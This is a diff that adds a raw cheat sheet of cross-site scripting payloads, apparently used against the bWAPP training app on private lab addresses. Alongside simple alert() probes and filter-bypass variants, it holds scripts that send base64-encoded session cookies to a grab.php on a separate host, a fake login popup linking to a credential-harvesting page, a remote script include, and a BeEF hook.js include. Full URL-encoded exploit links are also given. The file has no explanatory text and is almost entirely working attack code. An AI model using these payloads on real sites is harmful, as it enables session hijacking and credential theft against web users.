@@ -1,0 +1,78 @@
+awapt awapt
+<br />
+<h1>HELLO</h1>
+<a href='https://nba.com'>Go to NBA</a>
+<script>alert('1')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script>
+
+MEDIUM
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=javascript:alert(1)>
+<svg onload=alert(1)>
+-------------------------------------------------------
+<h1>HELLO</h1>
+<a href='https://nba.com'>Go to NBA</a>
+<script>alert('1')</script>
+<script>alert(1)</script>
+"}]}';</script><script>alert(document.cookie)</script><script>
+<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script>
+
+
+<h1>HELLO</h1>
+<a href='https://nba.com'>Go to NBA</a>
+<script>alert('1')</script>
+<script>alert(1)</script>
+
+<script>function f(){window.open('http://192.168.1.58/cookie4/logins.php','_target','width=450,height=420');}</script>
+<a href='http://' onclick='f()'>Please login to view more comments!</a>
+
+<script>document.write(document.cookie)</script>
+<script src=http://192.168.1.58/cookie4/s.js></script>
+
+DOM XSS
+></option></select><img src=x onerror='alert(document.cookie)'>
+
+
+<script src="http://192.168.204.128:3000/hook.js"></script>
+
+
+---------------------------------
+awapt awapt
+<br />
+<h1>HELLO</h1>
+<a href='https://nba.com'>Go to NBA</a>
+<script>alert('1')</script>
+<script>alert(document.cookie)</script>
+
+<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script>
+
+MEDIUM
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=javascript:alert(1)>
+<svg onload=alert(1)>
+
+------------------------------------------------------------------
+<script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script>
+
+http://192.168.204.130/bWAPP/xss_get.php?firstname=%3Cscript%3Evar+img%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2F192.168.1.58%2Fcookie4%2Fgrab.php%3Fcookie%3D%27%2Bbtoa%28document.cookie%29%3B%3C%2Fscript%3E&lastname=awapt1&form=submit
+
+
+
+"}]}';</script><script>alert(document.cookie)</script><script>
+
+"}]}';</script><script>var img=document.createElement('img');img.src='http://192.168.1.58/cookie4/grab.php?cookie='+btoa(document.cookie);</script><script>
+
+http://192.168.204.130/bWAPP/xss_json.php?title=%22%7D%5D%7D%27%3B%3C%2Fscript%3E%3Cscript%3Evar+img%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2F192.168.1.58%2Fcookie4%2Fgrab.php%3Fcookie%3D%27%2Bbtoa%28document.cookie%29%3B%3C%2Fscript%3E%3Cscript%3E&action=search
+
+
+
+<script>function f(){window.open('http://192.168.1.58/cookie4/logins.php','_target','width=450,height=420');}</script>
+<a href='http://' onclick='f()'>Please login to view more comments!</a>
+
+
+
